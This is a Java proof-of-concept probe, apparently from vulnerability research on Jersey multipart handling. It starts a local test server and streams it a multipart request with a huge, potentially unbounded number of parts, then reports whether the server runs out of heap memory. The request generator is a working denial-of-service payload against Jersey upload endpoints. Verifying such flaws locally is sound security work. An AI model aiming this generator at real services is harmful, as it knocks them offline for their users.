package org.example.dos.dynamic;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.concurrent.atomic.AtomicInteger;

import jakarta.ws.rs.Consumes;
import jakarta.ws.rs.POST;
import jakarta.ws.rs.Path;
import jakarta.ws.rs.Produces;
import jakarta.ws.rs.core.MediaType;

import org.glassfish.grizzly.http.server.HttpServer;
import org.glassfish.jersey.grizzly2.httpserver.GrizzlyHttpServerFactory;
import org.glassfish.jersey.media.multipart.FormDataMultiPart;
import org.glassfish.jersey.media.multipart.MultiPartFeature;
import org.glassfish.jersey.server.ResourceConfig;

public final class JerseyMultipartHttpProbe {
    private static final AtomicInteger MATERIALIZED_PARTS = new AtomicInteger();

    @Path("/upload")
    public static final class MultipartResource {
        @POST
        @Consumes(MediaType.MULTIPART_FORM_DATA)
        @Produces(MediaType.TEXT_PLAIN)
        public String upload(FormDataMultiPart multipart) {
            int parts = multipart.getFields().values().stream().mapToInt(list -> list.size()).sum();
            MATERIALIZED_PARTS.set(parts);
            multipart.cleanup();
            return "parts=" + parts;
        }
    }

    private static final class MultipartStreamingBody {
        private final String boundary;
        private final int parts;
        private final int payloadBytes;

        MultipartStreamingBody(String boundary, int parts, int payloadBytes) {
            this.boundary = boundary;
            this.parts = parts;
            this.payloadBytes = payloadBytes;
        }

        void writeTo(OutputStream out) throws IOException {
            byte[] payload = new byte[payloadBytes];
            for (int i = 0; i < parts; i++) {
                String prefix = "--" + boundary + "\r\n"
                        + "Content-Disposition: form-data; name=\"f" + i + "\"; filename=\"f" + i + ".txt\"\r\n"
                        + "Content-Type: text/plain\r\n\r\n";
                out.write(prefix.getBytes(StandardCharsets.ISO_8859_1));
                for (int j = 0; j < payload.length; j++) {
                    payload[j] = (byte) ('a' + (i % 26));
                }
                out.write(payload);
                out.write("\r\n".getBytes(StandardCharsets.ISO_8859_1));
            }
            out.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.ISO_8859_1));
        }
    }

    private static int postMultipart(String url, String boundary, int parts, int payloadBytes) throws Exception {
        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
        connection.setRequestMethod("POST");
        connection.setConnectTimeout(5000);
        connection.setReadTimeout(30000);
        connection.setDoOutput(true);
        connection.setChunkedStreamingMode(8192);
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        try (OutputStream out = connection.getOutputStream()) {
            new MultipartStreamingBody(boundary, parts, payloadBytes).writeTo(out);
        }
        int code = connection.getResponseCode();
        if (connection.getErrorStream() != null) {
            connection.getErrorStream().close();
        } else if (connection.getInputStream() != null) {
            connection.getInputStream().close();
        }
        return code;
    }

    public static void main(String[] args) throws Exception {
        int parts = Integer.parseInt(args[0]);
        int payloadBytes = Integer.parseInt(args[1]);
        int progressEvery = Integer.parseInt(args[2]);
        int port = Integer.parseInt(args[3]);
        String profile = args[4];
        int effectiveParts = parts < 0 ? Integer.MAX_VALUE : parts;

        ResourceConfig config = new ResourceConfig(MultipartResource.class).register(MultiPartFeature.class);
        HttpServer server = GrizzlyHttpServerFactory.createHttpServer(
                URI.create("http://127.0.0.1:" + port + "/"), config, false);
        server.start();

        ProbeSupport.printCommon("jersey-multipart-real-http", parts, payloadBytes, port, profile);
        System.out.println("progressEvery=" + progressEvery);
        System.out.flush();
        try {
            int code = postMultipart("http://127.0.0.1:" + port + "/upload", "----dosBoundary", effectiveParts, payloadBytes);
            if (code != 200) {
                throw new IllegalStateException("unexpected HTTP status " + code);
            }
            System.out.println("verdict=COMPLETED");
            System.out.println("materializedBodyParts=" + MATERIALIZED_PARTS.get());
        } catch (OutOfMemoryError oom) {
            System.out.println("verdict=CONFIRMED_HEAP_OOM_REAL_HTTP");
            System.out.println("generatedPartsBeforeOom=" + effectiveParts);
            System.out.println("materializedBodyPartsBeforeOom=" + MATERIALIZED_PARTS.get());
            System.out.println("usedHeapBytesAtOom=" + ProbeSupport.usedHeapBytes());
            System.out.flush();
            System.exit(ProbeSupport.OOM_EXIT_CODE);
        } catch (IOException io) {
            if (ProbeSupport.usedHeapBytes() > Runtime.getRuntime().maxMemory() * 90 / 100) {
                System.out.println("verdict=CONFIRMED_HEAP_OOM_REAL_HTTP");
                System.out.println("generatedPartsBeforeOom=" + effectiveParts);
                System.out.println("materializedBodyPartsBeforeOom=" + MATERIALIZED_PARTS.get());
                System.out.println("usedHeapBytesAtOom=" + ProbeSupport.usedHeapBytes());
                System.out.flush();
                System.exit(ProbeSupport.OOM_EXIT_CODE);
            }
            throw io;
        } finally {
            server.shutdownNow();
        }
    }
}
